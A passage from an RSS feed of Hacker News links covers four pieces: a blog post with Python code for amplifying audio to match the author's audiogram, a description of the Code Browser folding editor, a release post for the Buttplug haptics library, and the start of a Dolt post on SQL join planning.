<p><code>audiogram</code> variable keeps values of the above audiogram at the beginning of this post. <code>basedB</code> is rather an important variable. We’ll calculate our gain according to it. Let’s say, if we find that a window has a dominant frequency of 4000 Hz, then we need to apply <code>60.0 - 20.0 = 40.0 dB</code> gain to that window. It’s just the difference between how much normal people hear and how much I hear. That’s why the <code>basedB</code> variable should be chosen from the normal people’s hearing range.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span><span>import</span> sys</span><br><span></span><br><span>audiogram = [ </span><br><span>    [<span>125.0</span>,  <span>25.0</span>],</span><br><span>    [<span>250.0</span>,  <span>25.0</span>],</span><br><span>    [<span>500.0</span>,  <span>25.0</span>],</span><br><span>    [<span>1000.0</span>, <span>45.0</span>],</span><br><span>    [<span>2000.0</span>, <span>50.0</span>],</span><br><span>    [<span>4000.0</span>, <span>60.0</span>],</span><br><span>    [<span>6000.0</span>, <span>60.0</span>]</span><br><span>]</span><br><span></span><br><span></span><br><span></span><br><span>basedB = <span>25.0</span> </span><br></pre></td></tr></tbody></table></figure>

<p>Here is the function that will calculate dominant frequency. What it does is simple: it applies a fourier transform to the given window, finds the index of highest amplitude, and finally returns the corresponding frequency value.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>getDominantFreq</span><span>(sampleRate, window)</span>:</span></span><br><span>    </span><br><span>    yf = np.fft.fft(window)</span><br><span>    yf = np.abs(<span>2</span>*yf/len(window))</span><br><span></span><br><span>    windowSize = len(window)</span><br><span></span><br><span>    maxAmp = <span>0.0</span></span><br><span>    maxAmpIdx = <span>0</span></span><br><span>    <span>for</span> i <span>in</span> range(int(windowSize/<span>2</span>)):</span><br><span>        <span>if</span> yf[i] &lt;= maxAmp:</span><br><span>            <span>continue</span></span><br><span></span><br><span>        maxAmp = yf[i]</span><br><span>        maxAmpIdx = i</span><br><span></span><br><span>    </span><br><span>    freq = (sampleRate/<span>2</span>)*maxAmpIdx/(windowSize/<span>2</span>)</span><br><span></span><br><span>    <span>return</span> freq</span><br></pre></td></tr></tbody></table></figure>

<p><code>getGain</code> finds the threshold value according to the audiogram and returns its difference from the <code>basedB</code> value. That’s the gain we want to apply to our window.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>getGain</span><span>(freq)</span>:</span></span><br><span>    threshold = <span>0.0</span></span><br><span></span><br><span>    <span>if</span> freq &lt; audiogram[<span>0</span>][<span>0</span>]:</span><br><span>        threshold = audiogram[<span>0</span>][<span>1</span>]</span><br><span>    <span>else</span>:</span><br><span>        found = <span>False</span></span><br><span>        <span>for</span> i <span>in</span> range(len(audiogram)<span>-1</span>):</span><br><span>            <span>if</span> freq &gt;= audiogram[i+<span>1</span>][<span>0</span>]:</span><br><span>                <span>continue</span></span><br><span></span><br><span>            threshold = (audiogram[i+<span>1</span>][<span>1</span>] - audiogram[i][<span>1</span>]) * (freq - audiogram[i][<span>0</span>]) \</span><br><span>             / (audiogram[i+<span>1</span>][<span>0</span>] - audiogram[i][<span>0</span>]) + audiogram[i][<span>1</span>]</span><br><span></span><br><span>            found = <span>True</span></span><br><span>            <span>break</span></span><br><span></span><br><span>        <span>if</span> <span>not</span> found:</span><br><span>            threshold = audiogram[<span>-1</span>][<span>1</span>]</span><br><span></span><br><span>    <span>return</span> threshold - basedB</span><br></pre></td></tr></tbody></table></figure>

<p>Simple function to convert dB to amplitude. See <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">demofox’s blog</a>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>dBToAmplitude</span><span>(dB)</span>:</span></span><br><span>    <span>return</span> np.power(<span>10.0</span>, dB / <span>20.0</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>And now the main part. Here you can see that, first, the <code>wav</code> file is loaded into memory as samples, then the samples are iterated over in chunks of <code>window</code> with the size of <code>1024</code>,  <code>getDominantFreq</code> and <code>getGain</code> functions are called on and a gain was applied to those <code>window</code>s accordingly. At the last step, the new samples are written into <code>processed.wav</code> file. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    </span><br><span>    sampleRate, samples = wavfile.read(sys.argv[<span>1</span>], mmap=<span>True</span>)</span><br><span></span><br><span>    </span><br><span>    outSamples = np.array([])</span><br><span></span><br><span>    windowSize = <span>1024</span></span><br><span>    sampleIdx = <span>0</span></span><br><span>    <span>while</span> sampleIdx &lt; len(samples):</span><br><span>        window = samples[sampleIdx:sampleIdx+windowSize]</span><br><span></span><br><span>        freq = getDominantFreq(sampleRate, window)</span><br><span>        gain = getGain(freq)</span><br><span></span><br><span>        amp = dBToAmplitude(gain)</span><br><span></span><br><span>        amplified = window * amp</span><br><span>        outSamples = np.append(outSamples, amplified)</span><br><span></span><br><span>        sampleIdx += windowSize</span><br><span></span><br><span>    wavfile.write(<span>"processed.wav"</span>, sampleRate, outSamples)</span><br></pre></td></tr></tbody></table></figure>

<p>Now let’s run our code on the sine waves we’ve generated:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py generated.wav</span><br></pre></td></tr></tbody></table></figure>



<p>We can see that higher gain is applied to higher frequencies which is what we want. Let’s try this in a real-world example. Now take a look at the little part of one of my favorite books: </p>



<p>Let’s run our code with this recording:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py canticle_for_liebowitz.wav</span><br></pre></td></tr></tbody></table></figure>



<p>Damn. It hurts my ears. The problem  here is we’re applying gain even though it’s in my hearing range. For example, we shouldn’t add gain to 65 dB audio at any frequency. Also even if it’s out of my hearing range, we shouldn’t boost it too much. Let’s say if we have an audio with 55 dB at 4000 Hz, we shouldn’t amplify it to 85 dB which is too high. All we have to do is to shift it into my hearing range. </p>
<p>But what is 55 dB? For example, when we have an amplitude of 0.1, we can calculate the dB equivalent as <code>20 * log(0.1) = -20 dB</code>. Or we know 0 dB is full boost of the volume by <code>10^(0/20) = 1.0</code>. So, again, what the hell is 55 dB in “audiogram language” supposed to be?  </p>
<p>The answer lays in <strong>dB HL</strong> and <strong>dB SPL</strong>. HL stands for <em>Hearing Level</em> and SPL stands for <em>Sound Pressure Level</em>. dB SPL is basically the measurement of sound pressure. So the sound that makes no pressure is 0 dB and others are higher than 0 dB. Hearing levels are dB SPLs that are tailored for an audiogram. Do you remember in audiograms people’s hearing range starts from 0 dB? Well, that 0 dB HL is higher than 0 dB on the SPL scale and is different at every frequency because of how much the human ear hears. <a href="https://hearinglosshelp.com/blog/understanding-the-difference-between-sound-pressure-level-spl-and-hearing-level-hl-in-measuring-hearing-loss/" target="_blank" rel="noopener">Here</a> is a good reading on it.</p>
<p>There are many dB HL to dB SPL conversion charts. These conversions vary between the audiometers and the earphones used on those audiometers.</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/hl-to-spl.png" title="HL to SPL"></p><p>The problem here is I don’t know the standard of my audiogram’s calibration and I don’t know which earphones they have tested me with. So, we need to gather our own data. Let’s do our own hearing test! But this time we won’t be using dB SPL, we’ll just measure the usual dB values from my computer. The result will be specific to my computer but that’s fine. At least it’s going to be reliable. </p>
<p>Let’s create sine waves at the frequencies 125 Hz, 250 Hz, 500 Hz, 1000 Hz, 2000 Hz, 4000 Hz, and 6000 Hz with decreasing volume. Then, I’ll listen to the audio files and mark the last points I can hear something. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></pre></td><td><pre><span><span>import</span> numpy <span>as</span> np</span><br><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span>    duration = <span>0.05</span></span><br><span></span><br><span>    sampleCount = sampleRate * duration</span><br><span></span><br><span>    <span>for</span> freq <span>in</span> [<span>125</span>, <span>250</span>, <span>500</span>, <span>1000</span>, <span>2000</span>, <span>4000</span>, <span>6000</span>]:</span><br><span>        samples = np.array([])</span><br><span>        amp = <span>0.01</span></span><br><span></span><br><span>        t = <span>0.0</span></span><br><span>        <span>while</span> <span>True</span>:</span><br><span>            ta = np.linspace(t, t+duration, sampleCount)</span><br><span></span><br><span>            startTime = np.round(t, <span>2</span>)</span><br><span>            endTime = np.round(t+<span>0.05</span>, <span>2</span>)</span><br><span></span><br><span>            dB = np.round(<span>20</span> * np.log10(amp), <span>2</span>)</span><br><span></span><br><span>            print(<span>f"<span>{startTime}</span>-<span>{endTime}</span>s: <span>{dB}</span> dB"</span>)</span><br><span></span><br><span>            namples = np.sin(<span>2</span> * np.pi * freq * ta)</span><br><span>            namples *= amp</span><br><span></span><br><span>            t += duration</span><br><span>            amp -= <span>0.0001</span></span><br><span></span><br><span>            samples = np.append(samples, namples)</span><br><span></span><br><span>            <span>if</span> amp &lt;= <span>0.0</span>:</span><br><span>                <span>break</span></span><br><span></span><br><span>        wavfile.write(<span>f"sine_<span>{freq}</span>.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>Ok, the results are in. Look at that cool audiogram I created at <a href="https://www.canva.com/" target="_blank" rel="noopener">canva.com</a>:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/betteraudiogram.png" title="My Audiogram"></p><p>Haha. Now let’s edit our code. We’ll remove the basedB variable and add our new audiogram to the code:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></pre></td><td><pre><span>audiogram = [ </span><br><span>    [<span>125.0</span>,  <span>-66.02</span>],</span><br><span>    [<span>250.0</span>,  <span>-66.02</span>],</span><br><span>    [<span>500.0</span>,  <span>-67.96</span>],</span><br><span>    [<span>1000.0</span>, <span>-60.0</span>],</span><br><span>    [<span>2000.0</span>, <span>-47.96</span>],</span><br><span>    [<span>4000.0</span>, <span>-44.88</span>],</span><br><span>    [<span>6000.0</span>, <span>-44.44</span>]</span><br><span>]</span><br></pre></td></tr></tbody></table></figure>

<p>We’ll slightly edit <code>getDominantFreq</code> to return dominant frequency’s dB:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>amplitudeTodB</span><span>(amp)</span>:</span></span><br><span>    <span>return</span> <span>20</span> * np.log10(amp)</span><br><span></span><br><span></span><br><span></span><br><span><span><span>def</span> <span>getDominantFreq</span><span>(sampleRate, window)</span>:</span></span><br><span>    </span><br><span>    yf = np.fft.fft(window)</span><br><span>    yf = np.abs(<span>2</span>*yf/len(window))</span><br><span></span><br><span>    windowSize = len(window)</span><br><span></span><br><span>    maxAmp = <span>0.0</span></span><br><span>    maxAmpIdx = <span>0</span></span><br><span>    …</span></pre></td></tr></tbody></table></figure></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/">https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/</a></em></p>]]>
            </description>
            <link>https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562273</guid>
            <pubDate>Mon, 28 Dec 2020 19:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Browser]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25561688">thread link</a>) | @joubert
<br/>
December 28, 2020 | https://tibleiz.net/code-browser/ | <a href="https://web.archive.org/web/*/https://tibleiz.net/code-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">





<div id="content">
<h2>About</h2>
<p><b>Code Browser</b> is a folding text editor for Linux and Windows, 
designed to hierarchically structure any kind of text file and especially source 
code. It makes navigation through source code faster and easier.

</p><center><img src="https://tibleiz.net/code-browser/images/code-browser.png"></center>

<p>Code Browser is especially designed to keep a good overview of the code of 
large projects, but is also useful for a simple CSS file. 
Ideal if you are fed up of having to scroll through thousands of lines of code.

</p><p>See the <a href="https://tibleiz.net/code-browser/code-folding.html">Introduction to Code Folding</a> page if you
want more information on text folding and the way it is implemented in Code Browser.

</p><p>It supports syntax highlighting for all major languages and custom syntax 
highlighting can also be added.

</p><p>Although Code Browser was initially designed to edit programs, it can 
also be used for different tasks such as plain text outlining or helping to understand
existing source code. I've added a page with suggestions to
<a href="https://tibleiz.net/code-browser/tips.html">take advantage of folding</a>.

<!--[c]-->
</p><h2>License</h2>
<p>Code Browser is released under the GPL v2 License.

</p></div>



</div></div>]]>
            </description>
            <link>https://tibleiz.net/code-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561688</guid>
            <pubDate>Mon, 28 Dec 2020 18:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buttplug (Sex Toy Control Library) Hits v1 Milestone]]>
            </title>
            <description>
<![CDATA[
Score 311 | Comments 125 (<a href="https://news.ycombinator.com/item?id=25561392">thread link</a>) | @qdot76367
<br/>
December 28, 2020 | https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/ | <a href="https://web.archive.org/web/*/https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		
<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>



<figure><img loading="lazy" width="640" height="640" src="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png" alt="" srcset="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w" sizes="(max-width: 640px) 100vw, 640px"></figure>



<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>



<p>If you’re curious about what users are doing with Buttplug, <a href="https://github.com/buttplugio/awesome-buttplug">check out our awesome-buttplug project list repo</a>.</p>



<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning “Obfuscated Macros”</a>, which at the time seemed like a great name because Kyle was a 20-something engineer. This idea would grow to become the basis of Buttplug.</li></ul></li><li>2013<ul><li><a href="https://github.com/buttplugio/buttplug-py-deprecated">First Python implementation, known as “Fuck Everything”.</a> Uses ZeroMQ and Python 2. Never full shipped due to issues with python application redistribution, as well as lack of hardware on the market to support.</li></ul></li><li>Fall 2016<ul><li><a href="https://github.com/buttplugio/buttplug-rs">First Rust implementation.</a> Stalls due to lack of platform support for Bluetooth (most hardware we interact with is Bluetooth LE) and other hardware.</li></ul></li><li>April 2017<ul><li><a href="https://github.com/buttplugio/buttplug-csharp">First C# implementation, using the recently released UWP BTLE APIs for Windows.</a> Library gains momentum and project takes off, also establishing a <a href="https://buttplug-protocol-spec.docs.buttplug.io/">protocol spec</a> to ensure compatibility between versions.</li></ul></li><li>May 2017<ul><li><a href="https://github.com/buttplugio/buttplug-js">First JS implementation</a>, using WebBluetooth to access BTLE through the Chrome web browser. Later included native Node implementation using <a href="https://github.com/noble/noble">noble</a> and other hardware libraries.</li></ul></li><li>August 2017<ul><li>Kyle incorporates <a href="https://nonpolynomial.com/">Nonpolynomial</a></li></ul></li><li>December 2017<ul><li>Generic messages added to the Buttplug Protocol Spec, making it easier to command a wide range of devices. Due to maintenance timing and life in general, this is the last change to protocol spec for the next 3 years.</li></ul></li><li>April 2019<ul><li><a href="https://github.com/buttplugio/buttplug-py">Python implementation of Client API for Buttplug.</a> All hardware access was still managed via either JS or C# implementations.</li></ul></li><li>May 2019<ul><li>Established the <a href="https://intiface.com/">Intiface brand</a> for Buttplug applications developed by <a href="https://nonpolynomial.com/">Nonpolynomial</a>.</li></ul></li><li>Sept 2019<ul><li>Realize that maintaining 2 full implementations of Buttplug was untenable for a 1 person development team, work started on a new core implementation of Buttplug in (at that point unstable) async Rust, with other language implementations would then live on top of.</li></ul></li><li>January 2020<ul><li>Forked <a href="https://github.com/mwylde/rumble">Rumble</a> into <a href="https://github.com/deviceplug/btleplug">btleplug</a> (begrudgingly changing the name because rumble would’ve been GREAT to have in Buttplug but the original author was AWOL so package couldn’t be transfers on crates.io), brought up minimum BTLE capabilities in Windows, macOS, and Linux.</li></ul></li><li>October 2020<ul><li>Core async Rust Buttplug implementation hits feature parity with the C# and JS libraries. <a href="https://github.com/buttplugio/buttplug-rs-ffi">Move to porting C#/JS to using Rust via FFI</a>. C# calls into the native Rust library using exported C calls, while JS uses a WASM layer.</li></ul></li><li>December 2020<ul><li>v1 release, along with the first shipping of a new spec version since December 2017. FFI C#/JS libraries at parity with original native C#/JS libraries, original native libraries deprecated and archived. <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> in good enough shape to guide users on building simple Buttplug Applications. <a href="https://metafetish.com/">Metafetish</a> closes after 16 years in order to make way for new <a href="https://nonpolynomial.com/blog">Nonpolynomial blog</a>.</li></ul></li></ul>



<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>



<h2>Thanks</h2>



<p>Thanks go to:</p>



<ul><li>Loved ones and friends who’ve had to put up with me being “The Buttplug Guy” for the past 16 years (with no sign of that ending soon).</li><li>My <a href="https://patreon.com/qdot">Patreon</a> and <a href="https://github.com/sponsors/qdot">Github Sponsors</a> Subscribers, who’ve kept the project funded enough for me to buy new hardware.</li><li>My consulting clients for <a href="https://nonpolynomial.com/">Nonpolynomial</a>, who’ve helped keep the business cash positive while also helping my project along with support in their products.</li><li>Everyone who worked on reverse engineering toys and donating info to our <a href="https://stpihkal.docs.buttplug.io/">Sex Toys Protocols I Have Known And Loved (STPIHKAL) </a>documentation project.</li><li>Sex tech projects like <a href="https://iostindex.com/">IOSTI…</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</a></em></p>]]>
            </description>
            <link>https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561392</guid>
            <pubDate>Mon, 28 Dec 2020 18:01:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing join planning in our open source Golang SQL query engine]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25561173">thread link</a>) | @zachmu
<br/>
December 28, 2020 | https://www.dolthub.com/blog/2020-12-28-join-planning/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-12-28-join-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
